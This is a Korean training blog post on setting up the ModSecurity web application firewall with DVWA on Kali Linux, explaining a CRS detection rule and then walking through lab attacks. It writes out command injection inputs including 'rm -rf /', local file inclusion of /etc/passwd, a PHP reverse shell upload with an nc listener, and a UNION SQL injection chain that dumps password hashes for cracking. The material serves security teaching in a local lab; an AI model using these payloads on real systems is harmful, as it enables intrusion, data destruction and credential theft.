---
layout: post
title: ModSecurity
subtitle: SeSAC 성동캠퍼스 1기
author: 박지수
categories: SeSAC
---

### 1. ModSecurity란?
- 오픈소스 웹 애플리케이션 방화벽(WAF)
- SQL Injection, Cross-Site Scripting(XSS) 등의 웹 공격 탐지 및 차단
- Apache 웹 서버를 위한 주요 공격을 차단

### 2. ModSecurity 환경 설정
dvwa로 취약한 웹 어플리케이션 서버를 돌리고, modsecurity를 사용해 취약점을 탐지하고 차단하는 실습을 진행하자. 이를 위해 칼리 리눅스를 생성하과 다음과 같은 단계를 거쳐 dvwa를 구축하고 modsecurity를 설치하여 우리가 사용할 환경에 맞게 설정 해 주어야 한다.
#### 2.1. dvwa 설치
1. 칼리 리눅스 랩 설치 후 dvwa 실행 확인   
```shell
# apt install update
# apt install -y kali-linux-labs
# dvwa-start
```
위 명령어를 입력한 후 localhost:42001 로 접속하여 dvwa의 동작을 확인하라.  
`http://localhost:42001`
2. php.ini 파일 수정  
	php란 웹사이트 제작에 특화된 백엔드 언어이다. php.ini 파일은 웹 사이트에서 실행될 때 사용하는 구성 설정을 지정한다. 각 디렉토리에 들어있는 php.ini 파일을 수정하자
	```shell
	# mousepad etc/php/8.2/apache2/php.ini 

	870번째 라인의 allow_url_include = Off 를 On으로 바꾸고 저장
	```
	 위 과정을 etc/php/8.2/cli/php.ini에서도 수행 해 준다. 
3. dvwa 멈추고 아파치 웹서버의 루트로 배치 및 실행
	```shell
	# cp -r /usr/share/dvwa /var/www/html
	# service apache2 start
	```
4. 웹 브라우저에 접속하여 dvwa 설정
	1. `http://localhost/dvwa` 로 접속
	2. Setup/Reset DB 클릭
	3. 하단의 Create/Reset Database 클릭

	1. 새 창에 about:config 입력 후 엔터
	2. 검색창에 proxy 입력
	3. network.proxy.allow_hijacking_localhost 더블클릭하여 true로 바꾸기

#### 2.2. ModSecurity 설치 및 설정
1. ModSecurity 설치
	```shell
	# apt install libapache2-mod-security2 -y
	```
2. modsecurity.conf 수정
    ```shell
    # cp /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf
    # mousepad /etc/modsecurity/modsecurity.conf

    SecRuleEngine DetectionOnly On 
    ```
3. 아파치 재실행
    ```shell
    # systemctl restart apache2
    ```
만약 위 명령어를 입력했음에도 아파치가 실행되지 않는다면 다음 페이지를 참고하라
> [아파치 실행 에러](https://jisoo449.github.io/jisu_sec/sesac/2023/12/12/%EC%95%84%ED%8C%8C%EC%B9%98-%EC%8B%A4%ED%96%89-%EC%97%90%EB%9F%AC.html)

### 3. ModSecurity 설정
`/etc/apache2/sites-avaliable`에는 `000-default.conf`라는 파일이 존재한다. 이는 Apache 웹 서버에서 사이트의 구성을 정의하는 파일로, 특정 웹사이트/도메인에 대한 설정을 정의하는 내용이 들어 있다. 아래 순서를 따라 `000-default.conf`파일을 수정하여 apache 웹사이트에 ModSecurity를 정의하자.
1. cd /etc/apache2/sites-avaliable
2. mosuepad 000-default.conf
	파일의 맨 아래에 다음 코드 추가
    ```shell
    SecRuleEngine On
    SecRule ARGS:testparam "@contains test" "id:9999999,deny,status:403,msg:'TEST RULE'"
    ```
3. systemctl restart apache2 입력  


위 과정을 통해 ModSecurity 환경 설정을 마쳤다. 이후  
- `curl -X GET http://127.0.0.1/?testparam=test`를 cli에 입력  
혹은  
- `http://127.0.0.1/?testparam=test`를 브라우저에 입력  


하면 *<b><font size=4>403 Forbidden(접근 거부)페이지</font></b>* 확인이 가능하다. 

![403 forbidden image](https://jisoo449.github.io/jisu_sec/assets/images/post/403-forbidden.png)

<br/>
이는 위에서 추가한 규칙 중 `testparam "@contains test" ..."id:9999999,deny,... ` 에 해당하는 것이다.  

해당 규칙에 따르면 `testparam`의 인자값으로 test가 입력되어 요청이 들어올 시 이를 deny하고, 403 상태값을 리턴해야 한다.  

testparam에 test를 넣으면 Forbidden된 결과값이 출력되는 것이다. 

만약 위 인자값을 'test'를 제외한 아무 값이나 넣으면 정상적인 페이지가 리턴된다. 
![Apache success page](https://jisoo449.github.io/jisu_sec/assets/images/post/apache-browser.png)


### 4. modsecurity 룰 확인
modsecurity의 룰은 여러 방법으로 확인할 수 있다. 그 중 대표적으로 modsecurity.conf 파일을 확인하는 방법과 rules 디렉토리를 확인하는 방법이 있다.  

룰은 conf 파일에서 개별로 추가하는 것이 아닌 rules 디렉토리에 있는 분류에 따라 추가하는 것이 권장된다.

#### 4.1. 구성 파일
- `/etc/modsecurity/modsecurity.conf` 에 위치
- ModSecurity의 기본 동작, 로깅 수준, 데이터 처리 방법 등을 정의
- 보안 규칙 자체는 미포함
- ModSecurity의 전반적 동작 방식 설정  

#### 4.2. CRS(Core Rule Set)
- ModSecurity를 위한 기본적인 보안 규칙 모음이다. 
- `/usr/share/modsecurity-crs/rules`에 위치
- owsp와 관련된 다양한 rule set들이 존재하며, `{대문자}.conf` 의 네이밍 컨벤션을 가짐
	![ModSecurity Rules](https://jisoo449.github.io/jisu_sec/assets/images/post/modsecurity-rules.png)   

<br/>
몇몇 conf파일을 살펴보며 rule에 익숙해져 보자. 
```secrule
파일명: REQUEST-930-APPLICATION-ATTACK-LFI.conf

SecRule REQUEST_URI_RAW|ARGS|REQUEST_HEADERS|!REQUEST_HEADERS:Referer|XML:/* "@rx (?i)(?:\x5c|(?:%(?:c(?:0%(?:[2aq]f|5c|9v)|1%(?:
[19p]c|8s|af))|2(?:5(?:c(?:0%25af|1%259c)|2f|5c)|%46|f)|(?:(?:f(?:8%8)?0%8|e)0%80%a|bg%q)f|%3(?:2(?:%(?:%6|4)6|F)|5%%63)|u(?:221[
56]|002f|EFC8|F025)|1u|5c)|0x(?:2f|5c)|\/))(?:%(?:(?:f(?:(?:c%80|8)%8)?0%8|e)0%80%ae|2(?:(?:5(?:c0%25a|2))?e|%45)|u(?:(?:002|ff0)
e|2024)|%32(?:%(?:%6|4)5|E)|c0(?:%[256aef]e|\.))|\.(?:%0[01]|\?)?|\?\.?|0x2e){2}(?:\x5c|(?:%(?:c(?:0%(?:[2aq]f|5c|9v)|1%(?:[19p]c
|8s|af))|2(?:5(?:c(?:0%25af|1%259c)|2f|5c)|%46|f)|(?:(?:f(?:8%8)?0%8|e)0%80%a|bg%q)f|%3(?:2(?:%(?:%6|4)6|F)|5%%63)|u(?:221[56]|00
2f|EFC8|F025)|1u|5c)|0x(?:2f|5c)|\/))" \
    "id:930100,\
    phase:2,\
    block,\
    capture,\
    t:none,\
    msg:'Path Traversal Attack (/../)',\
    logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\
    tag:'application-multi',\
    .
```
- 첫 번째 필드
	- SecRule: 접두어. Security Rule임을 고지. 
	- XML 뒤를 보면 `(?:^|[\\/])\.\.(?:[\\/]|$)`라는 문자열을 볼 수 있다. 이는 file:/// 로 시작되는 공격을 탐지한다는 것을 의미한다. 
- 두 번째 필드
	- REQUEST_URI_RAW : 무엇을 탐지할지에 대해 작성한 필드. 이 값과 같은 경우는 URI 값을 Raw로 확인하겠다는 의미이다. 이는 인코딩 때문이다. 표준화된 값으로 체크하기 위함이다. 
	- ARGS : 변수를 체크하겠다.
	- REQUEST_HEADERS: 사용자가 요청하는 헤더 필드를 검사
	- !REQUEST_HEADERS:Referer : Refer라는 필드는 검사하지 않음
	- XML:/* : XML 필드를 검사
- 세 번째 필드
	- "@rx (?i)(?:...)...))" : 탐지할 문자열. 
		- LFI 공격은 보통 ../../../../../ 이나 file://// 등과 같은 방식으로 검증이 발생한다.
	- !@rx: 해당 문자열로 시작해야 한다는 의미
	- 괄호 : or
	- ? : 특정 문자열이 와도 상관x
- 네 번째 필드
	- id:930100, : 룰에 대한 고유 식별값
	- phase:2 : phase는 1부터 5까지 존재. 생략 가능. 각각의 플래그는 검사 범위를 나타낸다.
						- 1: REQUEST_HEADER
						- 2: 1+REQUEST_BODY
						- 3: 2+RESPONSE_HEADER
						- 4: 3+RESPONSE_BODY
						- 5: 전체
	- block : 차단을 나타내는 옵션. 실행 자체를 막는다. 이 외에도 deny라는 옵션도 존재한다. 
	- capture : 패킷/로그 를 기록. 생략 가능
	- t:none : 대소문자 구분/인코딩/디코딩 탐지 옵션. none은 default를 의미. 생략 가능. 
			  룰 작성 시에는 대소문자/인코딩 데이터 등을 고려해야 한다.
	- msg:'Path ...' : 탐지되었을 때 로그에 남길 메시지
	- logdata: ... : 날짜. 생략 가능
	- tag:'application-multi' : 식별 필드. 공격들을 그루핑하는 데 사용. 생략 가능


### 5. 취약점 실습
대표적인 웹 취약점 진단 항목으로는
- 파라미터 변조
- 게시글 입력
- 프로세스 검증 : 시큐어 코딩으로 대비
- 자동화 스캔  

가 있다. 이 중 프로세스 검증은 개발 단계에서 보완해야 하는 부분이다. 프로세스 검증을 제외한 파라미터 변조, 게시글 입력, 자동화 스캔은 웹 방화벽(WAF)으로 검증이 가능하다. 

웹에는 다양한 취약점이 존재한다. dvwa를 사용하여 웹 모의해킹을 실시하고, 웹의 취약점에 대해 알아보도록 하자.  

이를 하기에 앞서 dvwa의 security level을 조정하여 실습에 알맞은 환경을 구성하자. 아래 순서에 따라 security level을 조정하라.
1. `etc/modsecurity/modsecurity.conf` 의 7번째 라인 `SecRuleEngine On`을 `Off`로 변경  
2. `systemctl restart apache2`를 입력하여 시스템을 재시작  
3. `dvwa-start` 입력하여 dvwa 시작  
4. firefox에 접속하여 `127.0.0.1/dvwa` 혹은 `http://127.0.0.1:42001/index.php`로 접속  
5. 왼쪽 바에서 DVWA Security 클릭  
6. 하단 선택박스 impossible 에서 low로 변경 후 submit 

#### 5.1. Command Injection
>- 명령어 주입 공격
>- 시스템에서 사용하는 명령어를 사용할 수 있는 환경  
>- 취약점 발생 조건 : 소스코드 내 시스템 함수(exec, system, cmd, shell) 사용   

Command Inection 페이지의 컴포넌트 하단의 View Source를 클릭하여 Command Injection 소스코드를 간단하게 살펴보자.   
```php
Command Injection Source
vulnerabilities/exec/source/low.php

<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ]; 

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>
```
1. `$target = $_REQUEST[ 'ip' ];` : 사용자가 입력한 ip값을 가져온다.  
2. `$cmd = shell_exec( 'ping  ' . $target );` : 웹서버의 cmd창에 사용자에게 입력받은 ip로 ping을 보내는 코드를 입력한다.  
위의 상황에서 만약 사용자가 '8.8.8.8; rm -rf /'를 입력한다면 'rm -rf /' 가 실행되면서 서버의 모든 데이터가 삭제되는 보안 문제가 발생할 수 있다.   

**Command Injection 취약점을 검증하는 방법은 기호를 사용하는 것이다.** 취약점 검증에 사용되는 기호는 아래 같다.  
• `;` : 첫번째 명령어와 상관 없이 두번째 명령어 실행  
• `|` : 첫번째 명령어 에러 발생 시 두번째 명령어 실행  
• `||` : 첫번째 명령어 에러 발생 시 두번째 명령어 실행 안됨  
• `&&` : 첫번째 명령어 실행 시 두번째 명령어 실행  

*※주의! 입력되는 데이터의 인코딩 여부를 고려하라*  

dvwa의 command injection 페이지로 이동하여 입력칸에 ;ls 를 입력 해 보자.  
![DVWA command injection](https://jisoo449.github.io/jisu_sec/assets/images/post/dvwa-command-injection.png)
명령어가 실행되어 위 페이지가 존재하는 디렉토리 내의 모든 파일이 출력된 것을 확인할 수 있다.  

Command Injection 취약점은 네트워크 장비의 관리자 페이지(라우터, 스위치, 공유기 등)에서 자주 발견된다.(command injection은 일반적인 웹에서는 확인되지 않는다.) 따라서 Command Injection 취약점에 대한 보호는 WEB 서버 뿐만 아니라 모든 레벨(대역)에서 수행해야 한다. 

#### 5.2. File Inclusion
>- 파일 참조 공격
>- 취약점 원인: include, locate, show, content, action 등의 함수에서 발생
>- LFI(Local File Inclusion), RFI(Remote File Inclusion)로 나뉨

공격 유형으로는 LFI와 RFI가 있다. 각각에 대해 취약점 검증을 해 보자.  

<br/>

<b><font size=4>LFI</font></b>  
- 파라미터 인자값 입력 방식 공격  
- `../../../../../`  이나 `file://` 의 형식을 사용해 특정 위치 파일 참조  
- `?page=file1.php` 과 같은 **GET 요청 방식(쿼리스트링)은 취약점 확률이 높음.**  
- 타겟 서버에 저장된 파일을 열람하는 수준에서 그침  
- 취약점 확인 방법으로는 URL을 통한 확인방법과 소스코드를 통한 확인 방법이 있다.

	- 취약점 확인 방법1. URL  

		![URL을 통한 취약점 확인](https://jisoo449.github.io/jisu_sec/assets/images/post/url-lfi.png)
		`http://127.0.0.1:42001/vulnerabilities/fi/?page=file1.php` 를 살펴보면 get 메소드에 의해 페이지가 실행되는 것을 확인할 수 있다.   


	- 취약점 확인 방법2. 소스코드  

		`$file = $_GET[ 'page' ];`는 HTTP GET 요청을 통해 전달된 'page'의 값을 '$file'에 할당한다는 의미이다. 즉, GET이 취약점임을 확인할 수 있다.
		![Check LFI by source code](https://jisoo449.github.io/jisu_sec/assets/images/post/code-lfi.png)

- 취약점 실습  
	`http://127.0.0.1:42001/vulnerabilities/fi/?page=../../../../../etc/passwd` 를 입력하면 서버의 etc/passwd가 그대로 출력되는 것을 확인할 수 있다. 
	![exposed pwd](https://jisoo449.github.io/jisu_sec/assets/images/post/exposed-pwd.png)  

<br/>

<b><font size=4>RFI</font></b>
- Request_Body 필드에 입력
- http://~ 과 같은 원격지 주소로 취약점 점검
- 공격자가 만들어둔 취약한 페이지를 타겟 시스템으로 임포트하여 실행 -> REC 공격으로 연계 가능
- LFI가 확인된 곳에서라면 RFI도 확인 가능
- 취약점 실습
	`127.0.0.1:42001/vulnerabilities/fi/?page=http://google.com`를 url에 입력

*※모든 공격들은 encoding을 신경써야 한다.

<br/>

#### 5.3. File Upload
>- 게시판의 업로드 기능을 통해 악성 파일을 업로드하여 실행
>- 취약점: 확장자 기반의 필터링, 헤더 정보에 컨텐츠 타입 필터링
>- 취약점 검증: php, sh, html 등 확장자를 가지는 파일을 업로드 해 보면서 확인 
>- FileUpload는 게시판 뿐만 아니라 통신 메소드(GET, POST, PUT, DELETE, OPTION)를 통해서도 강제 업로드 할 수 있다.  

File Upload 공격은 게시판의 업로드 기능을 통해 악성 파일을 업로드하여 실행된다. 통신 메소드를 통해 공격이 시행되므로 다음과 같은 명령어를 사용해서 메소드 허용 여부를 확인한다.

- `curl -X OPTIONS -v http://127.0.0.1:42001/index.php`  
- `curl -X OPTIONS -v http://vulnweb.com`  

위 명령어를 통해서 확인할 수 있는 것은 PUT 메소드 허용 여부에 따라 발생하는 취약점이다. 다만 PUT 메소드가 허용되어 있어도 해당 디렉토리에 쓰기 권한이 활성화 되어 있지 않다면 사용할 수 없다.  

이 외에도 다른 통신 메소드의 취약점을 확인하고 싶다면 각각의 통신 메소드가 요구하는 path 규격에 맞추어 url을 수정하면 된다. 이에 관련한 취약점 진단을 하려 한다면 일반적인 도메인 뿐만 아니라 서브 도메인까지 체크해야 한다. 

아래 순서를 따라 취약점 코드가 포함된 php파일을 dvwa에 업로드하는 실습을 진행 해 보자. 
1. `cd /home/kali/Desktop`
2. `cp /usr/share/webshells/php/php-reverse-shell.php ./`
3. `ip ad` 로 ip 확인
4. `mousepad php-reverse-shell.php`
5. 49, 50번째 라인을 3번에서 알아온 ip로 수정
6. 브라우저 file upload로 가서 앞서 생성한 php-reverse-shell.php 업로드
	`../../hackable/uploads/php-reverse-shell.php succesfully uploaded!` 와 같은 문장 출력됨. 
	위에 나온 경로를 
7. 다시 터미널로 돌아와서 `nc -lvnp {php파일에서 설정한 포트번호}`
	![Listening...](https://jisoo449.github.io/jisu_sec/assets/images/post/file-upload-listening.png)

127.0.0.1:42001/hackable/uploads/php-reverse-shell.php 입력하면 아까 터미널에서 쉘 연결된 걸 확인 가능 

파일 업로드 단계에서의 취약점 코드는 다음과 같다
```php
File Upload Source
vulnerabilities/upload/source/low.php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // Can we move the file to the upload folder?
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        // No
        echo '<pre>Your image was not uploaded.</pre>';
    }
    else {
        // Yes!
        echo "<pre>{$target_path} succesfully uploaded!</pre>";
    }
}

?> 
```

<br/>

#### 5.4. SQL Injection
>- SQL 쿼리를 통해 원하는 정보를 추출하는 취약점
>- 백엔드에서 돌아가는 소스코드에 대해 알아야 한다.
>- SQL DB를 통해 쉘(OS Shell) 실행도 가능
>- 로그인 과정, 게시판 글 조회, 검색 등은 SQL 쿼리를 통해 이루어진다.

쿼리문을 살펴보며 SQL Injection이 어떤 방식으로 발생하는지 알아보자. 
```query
 $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```
해당 쿼리는 사용자가 입력한 id와 일치하는 사용자 이름을 유저 테이블에서 가져오라는 의미이다. 위 구문에서 `$id` 부분이 사용자가 입력한 id가 들어오는 부분이다. 

만약 악의적인 사용자가 `1' or '1'='1'#` 이라는 입력을 하게 되면 해당 query문은 다음과 같이 변할 것이다.  
`$query  = "SELECT first_name, last_name FROM users WHERE user_id = '1' or '1'='1'#;";` 
WHERE절의 조건이 `user_id='1' or '1'='1'`이 되므로 해당 조건문은 참이 된다. 따라서 쿼리문은 무조건 데이터를 반환하게 된다. 

SQL Injection에서는 Select 문의 조건절에 초점을 맞춘다. 조건절이 true가 되도록 쿼리를 완성하여 구조(문법) 오류를 제거하면 원하는 데이터를 받아올 수 있다. 

`$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";`  



주로 로그인 칸에 'or 1=1 # , 'or 1=1 -- 를 입력하는 방식을 사용한다. 
+) #, -- : 주석 처리 구문. DBMS의 종류에 따라 달라진다.

로그인 시 사용되는 쿼리는 다음과 같다. 
`WHERE userid='1 AND pass='abcd''`
쿼리 인젝션으로 ' 1=1 # 를 입력하면 쿼리는 아래와 같은 모습으로 변한다. 
`WHERE userid=''or1=1 #AND pass='abcd'`
즉, pass부분의 조건문은 주석처리 되므로 로그인 우회가 가능해진다. 

where...
'union select 1,2,3,...# 으로 컬럼개수를 파악한다. 구문오류 사용

`1'union select 1,1# ` 입력 시 출력 확인

select 1,@@version#

1' union select 1,schema_name from information_schema.schemata#
- schema_name : DB 이름
- information_schema : table, DB 정보를 가지고 있는 테이블. DB 이름, Table 이름, 컬럼명을 저장. 
다음과 같은 결과가 나온다.
```
ID: 1' union select 1,schema_name from information_schema.schemata#
First name: admin
Surname: admin

ID: 1' union select 1,schema_name from information_schema.schemata#
First name: 1
Surname: information_schema

ID: 1' union select 1,schema_name from information_schema.schemata#
First name: 1
Surname: dvwa
```

위에서 입력한 것에서 

1'union select 1,table_name from information_schema.tables #
모든 것이 출력된다. 

1'union select 1,table_name from information_schema.tables  where table_schema='dvwa'# 
를 입력하면 테이블을 지정할 수 있다. 
여기서 users라는 테이블이 있다는 것을 확인할 수 있다. 

여기서 컬럼명을 뽑아내 보자. 
1'union select 1,column_name from information_schema.columns where table_name='users'# 
우리는 여기서 user와 passwd를 알아보려고 한다. 
1'union select user,password from users#
```
ID: 'union select user,password from users#
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99

ID: 'union select user,password from users#
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03

ID: 'union select user,password from users#
First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b

ID: 'union select user,password from users#
First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7

ID: 'union select user,password from users#
First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

위에서 알아온 비밀번호 해시값을 cracksetation.net 에서 돌리면 로그인이 가능하다. 
md5는 crack이 쉽다. 



다만 SQL Injection을 실행하기 위해서는 탈취하고자 하는 서버의 쿼리 구조를 알아야 한다.